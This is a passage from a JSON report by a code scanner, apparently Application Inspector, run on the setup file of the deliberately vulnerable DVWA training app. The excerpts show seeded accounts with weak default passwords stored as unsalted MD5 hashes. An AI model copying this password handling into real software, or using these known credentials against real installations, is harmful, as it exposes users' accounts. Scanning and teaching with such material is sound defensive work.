        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "dvwaMessagePush( &quot;&lt;em&gt;Setup successful&lt;/em&gt;!&quot; );\n\nif( !dvwaIsLoggedIn())\n\tdvwaMessagePush( &quot;Please &lt;a href=&#39;login.php&#39;&gt;login&lt;/a&gt;.&lt;script&gt;setTimeout(function(){window.location.href=&#39;login.php&#39;},5000);&lt;/script&gt;&quot; );\ndvwaPageReload();\n\n?&gt;\n\n",
        "startLocationLine": 102,
        "startLocationColumn": 47,
        "endLocationLine": 102,
        "endLocationColumn": 52
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "dvwaMessagePush( &quot;&lt;em&gt;Setup successful&lt;/em&gt;!&quot; );\n\nif( !dvwaIsLoggedIn())\n\tdvwaMessagePush( &quot;Please &lt;a href=&#39;login.php&#39;&gt;login&lt;/a&gt;.&lt;script&gt;setTimeout(function(){window.location.href=&#39;login.php&#39;},5000);&lt;/script&gt;&quot; );\ndvwaPageReload();\n\n?&gt;\n\n",
        "startLocationLine": 102,
        "startLocationColumn": 109,
        "endLocationLine": 102,
        "endLocationColumn": 114
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tdvwaPageReload();\n}\n\n$create_tb = &quot;CREATE TABLE users (user_id int(6),first_name varchar(15),last_name varchar(15), user varchar(15), password varchar(32),avatar varchar(70), last_login TIMESTAMP, failed_login INT(3), PRIMARY KEY (user_id));&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $create_tb ) ) {\n\tdvwaMessagePush( &quot;Table could not be created&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n}\ndvwaMessagePush( &quot;&#39;users&#39; table was created.&quot; );\n",
        "startLocationLine": 43,
        "startLocationColumn": 135,
        "endLocationLine": 43,
        "endLocationColumn": 141
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\n// Insert some data into users\n$base_dir= str_replace (&quot;setup.php&quot;, &quot;&quot;, $_SERVER[&#39;SCRIPT_NAME&#39;]);\n$avatarUrl  = $base_dir . &#39;hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n",
        "startLocationLine": 53,
        "startLocationColumn": 2,
        "endLocationLine": 53,
        "endLocationColumn": 8
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "$avatarUrl  = $base_dir . &#39;hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n",
        "startLocationLine": 56,
        "startLocationColumn": 50,
        "endLocationLine": 56,
        "endLocationColumn": 56
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n",
        "startLocationLine": 57,
        "startLocationColumn": 51,
        "endLocationLine": 57,
        "endLocationColumn": 57
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n",
        "startLocationLine": 58,
        "startLocationColumn": 44,
        "endLocationLine": 58,
        "endLocationColumn": 50
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n}\n",
        "startLocationLine": 59,
        "startLocationColumn": 51,
        "endLocationLine": 59,
        "endLocationColumn": 57
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n}\ndvwaMessagePush( &quot;Data inserted into &#39;users&#39; table.&quot; );\n",
        "startLocationLine": 60,
        "startLocationColumn": 49,
        "endLocationLine": 60,
        "endLocationColumn": 55
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "\n/*\n\nThis file contains all of the code to setup the initial MySQL database. (setup.php)\n\n*/\n\nif( !defined( &#39;DVWA_WEB_PAGE_TO_ROOT&#39; ) ) {\n\tdefine( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../../&#39; );\n",
        "startLocationLine": 5,
        "startLocationColumn": 57,
        "endLocationLine": 5,
        "endLocationColumn": 62
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "}\n\nif( !@($GLOBALS[&quot;___mysqli_ston&quot;] = mysqli_connect( $_DVWA[ &#39;db_server&#39; ],  $_DVWA[ &#39;db_user&#39; ],  $_DVWA[ &#39;db_password&#39; ] )) ) {\n\tdvwaMessagePush( &quot;Could not connect to the MySQL service.&lt;br /&gt;Please check the config file.&quot; );\n\tif ($_DVWA[ &#39;db_user&#39; ] == &quot;root&quot;) {\n\t\tdvwaMessagePush( &#39;Your database user is root, if you are using MariaDB, this will not work, please read the README.md file.&#39; );\n\t}\n\tdvwaPageReload();\n}\n",
        "startLocationLine": 14,
        "startLocationColumn": 45,
        "endLocationLine": 14,
        "endLocationColumn": 50
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "$avatarUrl  = $base_dir . &#39;hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n",
        "startLocationLine": 56,
        "startLocationColumn": 31,
        "endLocationLine": 56,
        "endLocationColumn": 34
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n",
        "startLocationLine": 57,
        "startLocationColumn": 34,
        "endLocationLine": 57,
        "endLocationColumn": 37
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n",
        "startLocationLine": 58,
        "startLocationColumn": 26,
        "endLocationLine": 58,
        "endLocationColumn": 29
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n}\n",
        "startLocationLine": 59,
        "startLocationColumn": 33,
        "endLocationLine": 59,
        "endLocationColumn": 36
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$avatarUrl}pablo.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;5&#39;,&#39;Bob&#39;,&#39;Smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}smithy.jpg&#39;, NOW(), &#39;0&#39;);&quot;;\nif( !mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) );\n\tdvwaPageReload();\n}\ndvwaMessagePush( &quot;Data inserted into &#39;users&#39; table.&quot; );\n",
        "startLocationLine": 60,
        "startLocationColumn": 30,
        "endLocationLine": 60,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\n// Insert some data into users\n$base_dir= str_replace (&quot;setup.php&quot;, &quot;&quot;, $_SERVER[&#39;SCRIPT_NAME&#39;]);\n$avatarUrl  = $base_dir . &#39;hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$avatarUrl}admin.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$avatarUrl}gordonb.jpg&#39;, NOW(), &#39;0&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$avatarUrl}1337.jpg&#39;, NOW(), &#39;0&#39;),\n",
        "startLocationLine": 53,
        "startLocationColumn": 28,
        "endLocationLine": 53,
        "endLocationColumn": 32
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "Hack",
